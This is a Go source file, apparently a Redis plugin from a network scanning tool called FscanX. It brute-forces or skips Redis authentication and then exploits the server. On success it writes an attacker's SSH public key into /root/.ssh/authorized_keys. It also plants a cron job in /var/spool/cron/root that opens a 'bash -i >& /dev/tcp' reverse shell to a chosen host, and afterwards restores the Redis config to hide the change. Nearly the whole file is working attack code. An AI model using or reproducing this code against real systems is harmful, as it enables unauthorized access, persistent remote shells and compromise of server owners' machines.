package plugin

import (
	"FscanX/config"
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

func REDISEXTENDSHELL(info *config.HostData){
	_, err := redisConn(info,config.REDISFLAG.PassWord)
	if err != nil {
		//fmt.Println("[-]",err)
		config.WriteLogFile(config.LogFile,"[-] "+err.Error(),config.Inlog)

	}
}

func REDISSCAN(info *config.HostData)(tmperr error){
	starttime := time.Now().Unix()
	flag, err := RedisUnauth(info)
	if flag == true && err == nil {
		return err
	}
	for _, pass := range config.Passwords {
		pass = strings.Replace(pass, "{user}", "redis", -1)
		flag, err := redisConn(info, pass)
		if flag == true && err == nil {
			return err
		} else {
			errlog := fmt.Sprintf("[-] redis %v:%v %v %v", info.HostName, info.Ports, pass, err)
			_ = errlog
			tmperr = err
			if time.Now().Unix()-starttime > (int64(len(config.Passwords)) * info.TimeOut) {
				return err
			}
		}
	}
	return tmperr
}

func redisConn(info *config.HostData, pass string) (flag bool, err error) {
	flag = false
	realhost := fmt.Sprintf("%s:%v", info.HostName, info.Ports)
	conn, err := net.DialTimeout("tcp", realhost, time.Duration(info.TimeOut)*time.Second)
	if err != nil {
		return flag, err
	}
	defer func() {
		_ = conn.Close()
	}()
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(info.TimeOut)*time.Second))
	if err != nil {
		return flag, err
	}
	_, err = conn.Write([]byte(fmt.Sprintf("auth %s\r\n", pass)))
	if err != nil {
		return flag, err
	}
	reply, err := readreply(conn)
	if err != nil {
		return flag, err
	}
	if strings.Contains(reply, "+OK") {
		result := fmt.Sprintf("[+] Redis:%s %s", realhost, pass)
		//fmt.Println(result)
		config.WriteLogFile(config.LogFile,result,config.Inlog)
		flag = true
		err = Expoilt(realhost, conn)
	}
	return flag, err
}

func RedisUnauth(info *config.HostData) (flag bool, err error) {
	flag = false
	realhost := fmt.Sprintf("%s:%v", info.HostName, info.Ports)
	conn, err := net.DialTimeout("tcp", realhost, time.Duration(info.TimeOut)*time.Second)
	if err != nil {
		return flag, err
	}
	defer conn.Close()
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(info.TimeOut)*time.Second))
	if err != nil {
		return flag, err
	}
	_, err = conn.Write([]byte("info\r\n"))
	if err != nil {
		return flag, err
	}
	reply, err := readreply(conn)
	if err != nil {
		return flag, err
	}
	if strings.Contains(reply, "redis_version") {
		result := fmt.Sprintf("[+] %s [Redis unauthorized]", realhost)
		//fmt.Println(result)
		config.WriteLogFile(config.LogFile,result,config.Inlog)
		flag = true
		err = Expoilt(realhost, conn)
	}
	return flag, err
}
func Expoilt(realhost string, conn net.Conn) error {
	dbfilename, dir, err := getconfig(conn)
	if err != nil {
		return err
	}
	flagSsh, flagCron, err := testwrite(conn)
	if err != nil {
		return err
	}
	if flagSsh == true {
		result := fmt.Sprintf("[+] Redis:%v like can write /root/.ssh/", realhost)
		config.WriteLogFile(config.LogFile,result,config.Inlog)
		if config.RedisFile != "" {
			writeok, text, err := writekey(conn, config.RedisFile)
			if err != nil {
				//fmt.Println(fmt.Sprintf("[-] %v SSH write key errer: %v", realhost, text))
				config.WriteLogFile(config.LogFile,fmt.Sprintf("[-] %v SSH write key errer: %v", realhost, text),config.Inlog)
				return err
			}
			if writeok {
				result := fmt.Sprintf("[+] %v SSH public key was written successfully", realhost)
				config.WriteLogFile(config.LogFile,result,config.Inlog)
			} else {
				//fmt.Println("Redis:", realhost, "SSHPUB write failed", text)
				config.WriteLogFile(config.LogFile,"Redis: "+realhost+" SSHPUB write failed "+text,config.Inlog)
			}
		}
	}

	if flagCron == true {
		result := fmt.Sprintf("[+] Redis:%v like can write /var/spool/cron/", realhost)
		config.WriteLogFile(config.LogFile,result,config.Inlog)
		if config.RedisShell != "" {
			writeok, text, err := writecron(conn, config.RedisShell)
			if err != nil {
				return err
			}
			if writeok {
				result := fmt.Sprintf("[+] %v /var/spool/cron/root was written successfully", realhost)
				//fmt.Println(result)
				config.WriteLogFile(config.LogFile,result,config.Inlog)
			} else {
				//fmt.Println("[-] Redis:", realhost, "cron write failed", text)
				config.WriteLogFile(config.LogFile,"[-] Redis: "+realhost+" cron write failed "+text,config.Inlog)
			}
		}
	}
	err = recoverdb(dbfilename, dir, conn)
	return err
}

func writekey(conn net.Conn, filename string) (flag bool, text string, err error) {
	flag = false
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /root/.ssh/\r\n")))
	if err != nil {
		return flag, text, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, text, err
	}
	if strings.Contains(text, "OK") {
		_, err := conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename authorized_keys\r\n")))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}
		if strings.Contains(text, "OK") {
			key, err := Readfile(filename)
			if err != nil {
				text = fmt.Sprintf("Open %s error, %v", filename, err)
				return flag, text, err
			}
			if len(key) == 0 {
				text = fmt.Sprintf("the keyfile %s is empty", filename)
				return flag, text, err
			}
			_, err = conn.Write([]byte(fmt.Sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n", key)))
			if err != nil {
				return flag, text, err
			}
			text, err = readreply(conn)
			if err != nil {
				return flag, text, err
			}
			if strings.Contains(text, "OK") {
				_, err = conn.Write([]byte(fmt.Sprintf("save\r\n")))
				if err != nil {
					return flag, text, err
				}
				text, err = readreply(conn)
				if err != nil {
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					flag = true
				}
			}
		}
	}
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	return flag, text, err
}

func writecron(conn net.Conn, host string) (flag bool, text string, err error) {
	flag = false
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /var/spool/cron/\r\n")))
	if err != nil {
		return flag, text, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, text, err
	}
	if strings.Contains(text, "OK") {
		_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename root\r\n")))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}
		if strings.Contains(text, "OK") {
			scanIp, scanPort := strings.Split(host, ":")[0], strings.Split(host, ":")[1]
			_, err = conn.Write([]byte(fmt.Sprintf("set xx \"\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n", scanIp, scanPort)))
			if err != nil {
				return flag, text, err
			}
			text, err = readreply(conn)
			if err != nil {
				return flag, text, err
			}
			if strings.Contains(text, "OK") {
				_, err = conn.Write([]byte(fmt.Sprintf("save\r\n")))
				if err != nil {
					return flag, text, err
				}
				text, err = readreply(conn)
				if err != nil {
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					flag = true
				}
			}
		}
	}
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	return flag, text, err
}

func Readfile(filename string) (string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return "", err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			return text, nil
		}
	}
	return "", err
}

func readreply(conn net.Conn) (result string, err error) {
	buf := make([]byte, 4096)
	for {
		count, err := conn.Read(buf)
		if err != nil {
			break
		}
		result += string(buf[0:count])
		if count < 4096 {
			break
		}
	}
	return result, err
}

func testwrite(conn net.Conn) (flag bool, flagCron bool, err error) {
	var text string
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /root/.ssh/\r\n")))
	if err != nil {
		return flag, flagCron, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, flagCron, err
	}
	if strings.Contains(text, "OK") {
		flag = true
	}
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /var/spool/cron/\r\n")))
	if err != nil {
		return flag, flagCron, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, flagCron, err
	}
	if strings.Contains(text, "OK") {
		flagCron = true
	}
	return flag, flagCron, err
}

func getconfig(conn net.Conn) (dbfilename string, dir string, err error) {
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG GET dbfilename\r\n")))
	if err != nil {
		return
	}
	text, err := readreply(conn)
	if err != nil {
		return
	}
	text1 := strings.Split(text, "\n")
	if len(text1) > 2 {
		dbfilename = text1[len(text1)-2]
	} else {
		dbfilename = text1[0]
	}
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG GET dir\r\n")))
	if err != nil {
		return
	}
	text, err = readreply(conn)
	if err != nil {
		return
	}
	text1 = strings.Split(text, "\n")
	if len(text1) > 2 {
		dir = text1[len(text1)-2]
	} else {
		dir = text1[0]
	}
	return
}

func recoverdb(dbfilename string, dir string, conn net.Conn) (err error) {
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename %s\r\n", dbfilename)))
	if err != nil {
		return
	}
	dbfilename, err = readreply(conn)
	if err != nil {
		return
	}
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir %s\r\n", dir)))
	if err != nil {
		return
	}
	dir, err = readreply(conn)
	if err != nil {
		return
	}
	return
}